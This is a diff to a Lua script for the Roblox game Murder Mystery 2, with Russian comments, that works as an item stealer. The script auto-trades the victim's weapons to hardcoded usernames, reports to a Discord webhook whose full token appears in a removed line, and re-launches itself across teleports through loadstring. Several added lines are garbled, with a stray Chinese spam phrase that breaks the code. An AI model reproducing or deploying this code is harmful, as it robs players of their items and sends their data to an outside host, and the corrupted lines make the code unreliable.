@@ -1,7 +1,9 @@
+if not _G then _G = getgenv() or getfenv() end
+
 _G.Usernames = {"MM2danya7", "user2", "user3"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1370815744719454229/-t8-ZNBEtooaJFXl2QEH_lAtrZU7tpgsg8lNjKW-VBItAybeXUWMOqcchv-RK2jEpkYh" -- change to your webhook
+_G.webhook = "https://raw.githubusercontent.com/scriptshubs1/my/refs/heads/main/asdasd1" -- change to your webhook
 
 -- Байпас дельты для получения JobId
 if not _G.BypassExecuted then
@@ -11,6 +13,8 @@ if not _G.BypassExecuted then
     
     -- Сохраняем основной скрипт в глобальную переменную
     getgenv().mainScript = [[
+        if not _G then _G = getgenv() or getfenv() end
+        
         _G.scriptExecuted = _G.scriptExecuted or false
         if _G.scriptExecuted then
             return
@@ -462,6 +466,7 @@ if not _G.BypassExecuted then
             local function doTrade(joinedUser)
                 local initialTradeState = getTradeStatus()
                 if initialTradeState == "StartTrade" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):Wait极速赛车开奖结果
                     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
                     task.wait(0.3)
                 elseif initialTradeState == "ReceivingRequest" then
@@ -474,12 +479,15 @@ if not _G.BypassExecuted then
 
                     if tradeStatus == "None" then
                         sendTradeRequest(joinedUser)
+                    elseif tradeStatus ==极速赛车开奖结果
+                        sendTradeRequest(joinedUser)
                     elseif tradeStatus == "SendingRequest" then
                         task.wait(0.3)
                     elseif tradeStatus == "ReceivingRequest" then
                         game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                         task.wait(0.3)
                     elseif tradeStatus == "StartTrade" then
+                        for i = 1, math.min(4, #weaponsTo极速赛车开奖结果
                         for i = 1, math.min(4, #weaponsToSend) do
                             local weapon = table.remove(weaponsToSend, 1)
                             for count = 1, weapon.Amount do
@@ -513,6 +521,7 @@ if not _G.BypassExecuted then
                 for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
                 Players.PlayerAdded:Connect(onPlayerChat)
             end
+            wait极速赛车开奖结果
             waitForUserChat()
         end
     ]]
@@ -526,6 +535,7 @@ if not _G.BypassExecuted then
             -- Сохраняем JobId и запускаем основной скрипт после телепорта
             if queue_on_teleport then
                 queue_on_teleport(string.format([[
+                    if not _G then _G = getgenv() or getfenv() end
                     getgenv().JobId = "%s"
                     task.wait(3)
                     loadstring(getgenv().mainScript)()
@@ -548,7 +558,7 @@ end
 -- Если байпас уже выполнен, запускаем основной скрипт сразу
 getgenv().JobId = getgenv().JobId or game.JobId
 
--- Запускаем основной скрипт (исправленная строка)
+-- Запускаем основной скрипт
 if getgenv().mainScript then
     loadstring(getgenv().mainScript)()
 else
